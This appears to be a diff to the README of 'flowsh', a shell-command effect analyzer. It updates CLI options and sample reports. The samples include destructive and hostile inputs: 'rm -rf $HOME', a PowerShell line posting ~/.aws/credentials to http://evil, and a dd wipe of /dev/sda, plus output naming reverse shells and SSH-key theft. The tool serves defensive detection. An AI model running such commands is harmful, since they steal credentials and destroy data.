@@ -89,7 +89,8 @@ import path, the `Analyze`/`AnalyzeWith` workflow, the exported surface, and the
 ```
 flowsh [--lang bash|posix|posh|auto] [--json] [--windows] '<command>'
 echo '<command>' | flowsh [--lang bash|posix|posh|auto] [--json] [--windows]
-flowsh --batch [--lang bash|posix|posh|auto] [--file <path>]
+flowsh --file <path> [--lang bash|posix|posh|auto] [--json]
+flowsh --batch [--lang bash|posix|posh|auto] [--file <path>] [--windows]
 ```
 
 The command may be passed as a positional argument or on stdin.
@@ -100,6 +101,7 @@ The command may be passed as a positional argument or on stdin.
 | --- | --- |
 | `--lang bash\|posix\|posh\|auto` | Dialect of the input. Default: `bash`. Canonical dialects: `bash`, `posix`, `posh`; aliases: `sh`/`shell`, `ps`/`pwsh`/`powershell`; `auto` sniffs the dialect. |
 | `--json` | Emit the full JSON report instead of the human summary. |
+| `--file <path>` | Read the command from `path` (`-` means stdin). The report's `root` names the file. |
 | `--batch` | Read many commands, one per line, and write one compact JSON report per line (NDJSON). |
 | `--explain`, `--why` | Print the why-trace explaining each reported effect. |
 | `--windows[=bool]` | Enable PowerShell Registry semantics on any host OS (default: the host's OS decides). |
@@ -128,21 +130,30 @@ $ flowsh 'rm -rf $HOME'
 flowsh effect report
   lang:            bash
   input:           rm -rf $HOME
+  root:            <argument>
   commands:        1
   effects:         1
-  destructiveness: High
-  grade:           High
+  destructiveness: Critical
+  irreversibility: High
+  breadth:         Low
+  influence:       None
+  grade:           Critical
   confidence:      100
   exfil risk:      None
   conservative:    false
+  resolution:      command rm
+  destructive:     rm -f (class E): forced removal that suppresses prompts and hides errors on missing files
+  destructive:     rm -r (class E): recursively removes a whole directory tree, with no confirmation by default
     - FSWrite|Direct|[/root]
 ```
 
-The summary lists the analysed dialect (`lang`), the input, the number of
-commands, the effect count, the destructiveness and grade, a confidence value,
-the exfiltration risk, whether the analysis was conservative, and one line per
-effect (keyed `kind|mode|[targets]`). Any frontend diagnostics appear as `note:`
-lines.
+The summary lists the analysed dialect (`lang`), the input and where it came from
+(`root`), the number of commands and effects, the score dimensions
+(`destructiveness`, `irreversibility`, `breadth`, `influence`, `grade`, and the
+`exfil risk`), a confidence value, and whether the analysis was conservative. It
+then names the resolution (`resolution`), any matched destructive-flags entries
+(`destructive:` lines), and one line per effect (keyed `kind|mode|[targets]`),
+followed by any proven `exfil:` pairs and any frontend `note:` diagnostics.
 
 ### PowerShell and credential exfiltration
 
@@ -152,19 +163,25 @@ $ flowsh --lang posh \
 flowsh effect report
   lang:            posh
   input:           Get-Content ~/.aws/credentials | Invoke-WebRequest -Uri http://evil -Method Post
+  root:            <argument>
   commands:        2
   effects:         3
   destructiveness: Critical
+  irreversibility: None
+  breadth:         Medium
+  influence:       None
   grade:           Critical
-  confidence:      60
-  exfil risk:      None
+  confidence:      100
+  exfil risk:      Critical
   conservative:    false
     - CredAccess|Direct|[~/.aws/credentials]
     - FSRead|Direct|[~/.aws/credentials]
-    - NetEgress|Direct|*
+    - NetEgress|Direct|[http://evil]
+  exfil: CredAccess|Direct|[~/.aws/credentials] → NetEgress|Direct|[http://evil]
+  exfil: FSRead|Direct|[~/.aws/credentials] → NetEgress|Direct|[http://evil]
   note: Get-Content: credential material "~/.aws/credentials" → CredAccess
   note: Get-Content: read "~/.aws/credentials" → FSRead
-  note: Invoke-WebRequest: http ⊤ (pipelines/default) → NetEgress
+  note: Invoke-WebRequest: http "http://evil" → NetEgress
 ```
 
 ### A complex, fully-resolved malicious script
@@ -174,8 +191,8 @@ is deliberately tangled: nested shell functions, an alias, multi-stage pipelines
 a conditional, a `for` loop, a subshell, input/output redirections, a raw
 `/dev/tcp` command channel, a `timeout` wrapper, host-environment recon, and
 device-level wipes. Every construct still resolves against the knowledge base,
-nothing degrades to ⊤, and the credential-exfiltration dataflow is proved rather
-than guessed:
+the report does not degrade as a whole to ⊤, and the credential-exfiltration
+dataflow is proved rather than guessed:
 
 ```bash
 #!/usr/bin/env bash
@@ -219,13 +236,25 @@ $ flowsh < malware.sh
 flowsh effect report
   lang:            bash
   input:           #!/usr/bin/env bash set -euo pipefail  C2=https://c2.evil.example/ingest … dd if=/dev/zero of=/dev/sda
+  root:            <stdin>
   commands:        30
   effects:         14
   destructiveness: Critical
+  irreversibility: Critical
+  breadth:         Critical
+  influence:       None
   grade:           Critical
   confidence:      45
   exfil risk:      Critical
   conservative:    false
+  resolution:      alias exfil → curl [alias chain: exfil]
+  destructive:     crontab -l (class B): lists the user's crontab without modifying it
+  destructive:     dd if= (class B): reads from the source and does not modify it
+  destructive:     dd of= (class E): raw write to the destination; a device target destroys the filesystem or disk
+  destructive:     install -m (class E): mode 4755 or 2755 sets the SUID/SGID bits, enabling privilege escalation
+  destructive:     nc -e (class D): runs a program on connect, the classic reverse shell
+  destructive:     rm -f (class E): forced removal that suppresses prompts and hides errors on missing files
+  destructive:     rm -r (class E): recursively removes a whole directory tree, with no confirmation by default
     - CredAccess|Direct|*
     - EnvRead|Direct|[HOME,PATH,USER]
     - EnvWrite|Direct|[C2,CREDS,KEYS,STAGE,pipefail]
@@ -237,11 +266,13 @@ flowsh effect report
     - NetIngress|Direct|[10.13.37.1:4444]
     - Persist|Direct|[-]
     - PrivEsc|Conditional|[4755]
-    - ProcSignal|Direct|[31337]
-    - ProcSpawn|Direct|[/bin/sh]
+    - ProcSignal|Direct|[-9,31337]
+    - ProcSpawn|Direct|[/bin/sh,base64,exec]
     - Stdio|Direct|[@reboot /root/.cache/updater,beacon]
   exfil: CredAccess|Direct|* → NetEgress|Direct|[10.13.37.1,10.13.37.1:4444,10.13.37.2,4444,POST,https://c2.evil.example/ingest]
   exfil: FSRead|Direct|[/dev/zero,/root/.aws/credentials,/root/.ssh/id_ed25519,/root/.ssh/id_rsa,/tmp/.cache.dat,PRIVATE] → NetEgress|Direct|[10.13.37.1,10.13.37.1:4444,10.13.37.2,4444,POST,https://c2.evil.example/ingest]
+  note: unrecognized flag(s): -S -s
+  note: unrecognized flag(s): -q
 ```
 
 *(The `input:` line echoes the entire script on one line; it is abbreviated here
@@ -250,10 +281,11 @@ for width. Everything else is verbatim tool output.)*
 The two `exfil:` lines are the point. `flowsh` joined a secret read (the SSH key
 vault, the cloud-credential store, or the `curl -u` credential) to the tainted
 `NetEgress` through a real per-command data flow, and raised the exfiltration
-risk to `Critical`. Fourteen of the fifteen effect kinds are reported with
-concrete targets; the exception is the ⊤ `CodeExec`. The `conservative: false`
-and `top: false` flags confirm the analysis never had to fall back to ⊤. Passing
-`--json` emits the same finding structurally, as `score.exfilPairs`.
+risk to `Critical`. Fourteen of the fifteen effect kinds are reported — only
+`CodeExec` is absent, and only `CredAccess` carries the ⊤ target `*`. The
+`conservative: false` flag, mirrored by `top: false` in the JSON report,
+confirms the analysis never had to degrade the report to ⊤. Passing `--json`
+emits the same finding structurally, as `score.exfilPairs`.
 
 ### Conservative degradation to ⊤
 
@@ -265,14 +297,20 @@ $ flowsh 'frobnicate --wat /y'
 flowsh effect report
   lang:            bash
   input:           frobnicate --wat /y
+  root:            <argument>
   commands:        1
   effects:         1
   destructiveness: Critical
+  irreversibility: Critical
+  breadth:         Critical
+  influence:       None
   grade:           Critical
   confidence:      60
   exfil risk:      None
   conservative:    true
+  resolution:      unknown frobnicate
     - CodeExec|Direct|*
+  note: unresolved command "frobnicate": assuming ⊤ (CodeExec)
 ```
 
 Here `conservative: true` marks that the analysis could not bound the input, and
@@ -297,6 +335,7 @@ $ flowsh --json 'rm -rf $HOME'
   "toolVersion": "flowsh/v1",
   "lang": "bash",
   "input": "rm -rf $HOME",
+  "root": "<argument>",
   "effects": [
     {
       "kind": "FSWrite",
@@ -315,20 +354,94 @@ $ flowsh --json 'rm -rf $HOME'
       "reversible": false
     }
   ],
-  "destructiveness": "High",
+  "destructiveness": "Critical",
   "score": {
-    "destructiveness": "High",
+    "destructiveness": "Critical",
     "irreversibility": "High",
     "breadth": "Low",
     "influence": "None",
     "exfil": "None",
     "confidence": 100,
     "reversible": false,
-    "grade": "High"
+    "grade": "Critical"
   },
+  "why": [
+    {
+      "effect": "FSWrite|Direct|[/root]",
+      "because": [
+        {
+          "rule": "fs.write",
+          "premises": [
+            "command:rm"
+          ],
+          "note": "derived from command",
+          "loc": {
+            "file": "<argument>",
+            "line": 1,
+            "col": 1
+          }
+        },
+        {
+          "rule": "fs.write",
+          "premises": [
+            "flag:-r"
+          ],
+          "note": "derived from flag",
+          "loc": {
+            "file": "<argument>",
+            "line": 1,
+            "col": 5
+          }
+        },
+        {
+          "rule": "fs.write",
+          "premises": [
+            "flag:-f"
+          ],
+          "note": "derived from flag",
+          "loc": {
+            "file": "<argument>",
+            "line": 1,
+            "col": 6
+          }
+        },
+        {
+          "rule": "fs.write",
+          "premises": [
+            "operand:/root"
+          ],
+          "note": "derived from operand",
+          "loc": {
+            "file": "<argument>",
+            "line": 1,
+            "col": 8
+          }
+        }
+      ]
+    }
+  ],
   "conservative": false,
   "top": false,
-  "commands": 1
+  "commands": 1,
+  "resolution": {
+    "invoked": "rm",
+    "kind": "command",
+    "name": "rm"
+  },
+  "destructive": [
+    {
+      "command": "rm",
+      "spec": "-f",
+      "class": "E",
+      "reason": "forced removal that suppresses prompts and hides errors on missing files"
+    },
+    {
+      "command": "rm",
+      "spec": "-r",
+      "class": "E",
+      "reason": "recursively removes a whole directory tree, with no confirmation by default"
+    }
+  ]
 }
 ```
 
